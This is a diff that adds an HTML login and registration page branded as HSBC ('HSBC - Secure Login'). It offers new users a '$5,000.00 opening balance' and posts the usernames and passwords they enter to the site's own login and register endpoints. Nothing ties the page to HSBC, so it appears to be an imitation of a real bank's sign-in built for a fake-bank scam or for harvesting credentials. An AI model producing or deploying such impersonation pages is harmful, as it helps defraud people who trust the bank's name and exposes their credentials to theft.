@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>HSBC - Secure Login</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="default">
+    
+    <style>
+        :root { --hsbc-red: #db0011; --dark-gray: #333; --light-gray: #f4f4f4; }
+        
+        /* Mobile Reset */
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            margin: 0; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background: #fff; 
+            display: flex; 
+            flex-direction: column; 
+            height: 100vh;
+            color: var(--dark-gray);
+        }
+        
+        .header { padding: 50px 20px 30px; text-align: center; }
+        .logo { color: var(--hsbc-red); font-weight: 900; font-size: 36px; letter-spacing: -2px; }
+        
+        .login-container { padding: 0 25px; flex-grow: 1; max-width: 500px; margin: 0 auto; width: 100%; }
+        
+        h2 { font-size: 28px; font-weight: bold; margin-bottom: 8px; }
+        .subtext { color: #666; font-size: 15px; margin-bottom: 35px; line-height: 1.4; }
+
+        .input-group { margin-bottom: 25px; position: relative; }
+        label { display: block; font-size: 12px; font-weight: bold; color: #767676; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        input { 
+            width: 100%; 
+            padding: 12px 0; 
+            border: none; 
+            border-bottom: 2px solid #ddd; 
+            font-size: 18px; 
+            outline: none; 
+            background: transparent;
+            border-radius: 0; /* Prevents iOS rounded input default */
+        }
+        
+        input:focus { border-bottom-color: var(--hsbc-red); }
+
+        /* Show/Hide Password Toggle */
+        .toggle-password {
+            position: absolute;
+            right: 0;
+            bottom: 12px;
+            font-size: 14px;
+            color: var(--hsbc-red);
+            font-weight: bold;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .btn-primary { 
+            background: var(--hsbc-red); 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 4px; 
+            font-weight: bold; 
+            font-size: 16px; 
+            margin-top: 20px; 
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        .btn-primary:active { opacity: 0.8; } /* Mobile tap feedback */
+
+        .forgot-link {
+            text-align: right;
+            margin-top: -15px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: var(--hsbc-red);
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        .toggle-link { text-align: center; margin-top: 30px; font-size: 15px; color: #444; }
+        .toggle-link span { color: var(--hsbc-red); font-weight: bold; cursor: pointer; text-decoration: underline; }
+
+        /* Modal / Popup Styling */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+        }
+        .modal-content {
+            background-color: white;
+            margin: 20% auto;
+            padding: 30px;
+            width: 85%;
+            max-width: 400px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        /* Mobile specific spacing for notched phones */
+        @supports (padding: env(safe-area-inset-top)) {
+            .header { padding-top: calc(30px + env(safe-area-inset-top)); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">HSBC</div>
+    </div>
+
+    <div class="login-container">
+        <h2 id="form-title">Log on</h2>
+        <p id="form-subtext" class="subtext">Enter your details to manage your Global Money account.</p>
+
+        <div class="input-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" autocomplete="username" spellcheck="false" placeholder="Enter username">
+        </div>
+
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" autocomplete="current-password" placeholder="Enter password">
+            <span class="toggle-password" onclick="togglePasswordVisibility()" id="pass-toggle">SHOW</span>
+        </div>
+
+        <div class="forgot-link" id="forgot-password-btn" onclick="showForgotModal()">Forgot password?</div>
+
+        <button class="btn-primary" onclick="handleSubmit()" id="submit-btn">Continue</button>
+
+        <div class="toggle-link">
+            <p id="toggle-wrapper">New to HSBC? <span id="toggle-text" onclick="toggleMode()">Create an account</span></p>
+        </div>
+    </div>
+
+    <div id="forgotModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-top:0">Account Recovery</h3>
+            <p style="font-size: 14px; color: #666;">For security reasons, please contact our 24/7 support team to reset your password or visit your nearest HSBC branch.</p>
+            <button class="btn-primary" onclick="closeForgotModal()">Close</button>
+        </div>
+    </div>
+
+    <script>
+        let isLoginMode = true;
+
+        // --- PASSWORD VISIBILITY LOGIC ---
+        function togglePasswordVisibility() {
+            const passInput = document.getElementById('password');
+            const toggleBtn = document.getElementById('pass-toggle');
+            if (passInput.type === "password") {
+                passInput.type = "text";
+                toggleBtn.innerText = "HIDE";
+            } else {
+                passInput.type = "password";
+                toggleBtn.innerText = "SHOW";
+            }
+        }
+
+        // --- FORGOT PASSWORD MODAL ---
+        function showForgotModal() {
+            document.getElementById('forgotModal').style.display = "block";
+        }
+        function closeForgotModal() {
+            document.getElementById('forgotModal').style.display = "none";
+        }
+
+        // --- REGISTRATION VS LOGIN TOGGLE ---
+        function toggleMode() {
+            isLoginMode = !isLoginMode;
+            const title = document.getElementById('form-title');
+            const subtext = document.getElementById('form-subtext');
+            const btn = document.getElementById('submit-btn');
+            const wrapper = document.getElementById('toggle-wrapper');
+            const forgotBtn = document.getElementById('forgot-password-btn');
+
+            if (isLoginMode) {
+                title.innerText = "Log on";
+                subtext.innerText = "Enter your details to manage your Global Money account.";
+                btn.innerText = "Continue";
+                forgotBtn.style.display = "block";
+                wrapper.innerHTML = 'New to HSBC? <span id="toggle-text" onclick="toggleMode()">Create an account</span>';
+            } else {
+                title.innerText = "Register";
+                subtext.innerText = "Create a secure account to receive your $5,000.00 opening balance.";
+                btn.innerText = "Create Account";
+                forgotBtn.style.display = "none";
+                wrapper.innerHTML = 'Already have an account? <span id="toggle-text" onclick="toggleMode()">Log on</span>';
+            }
+        }
+
+        // --- SUBMIT LOGIC ---
+        async function handleSubmit() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert("Please enter both username and password");
+                return;
+            }
+
+            const endpoint = isLoginMode ? '/api/login' : '/api/register';
+            
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    if (isLoginMode) {
+                        // Check if it's the Master Admin redirecting
+                        if (data.isAdmin) {
+                            window.location.href = data.redirect;
+                        } else {
+                            localStorage.setItem('currentUser', username);
+                            window.location.href = data.redirect || '/index.html';
+                        }
+                    } else {
+                        alert("Success! Account created. You can now log on.");
+                        toggleMode();
+                    }
+                } else {
+                    alert(data.error || "An error occurred");
+                }
+            } catch (error) {
+                console.error("Auth Error:", error);
+                alert("Connection error. Is your server running?");
+            }
+        }
+
+        // Close modal if clicking outside of it
+        window.onclick = function(event) {
+            const modal = document.getElementById('forgotModal');
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+    </script>
+</body>
+</html>
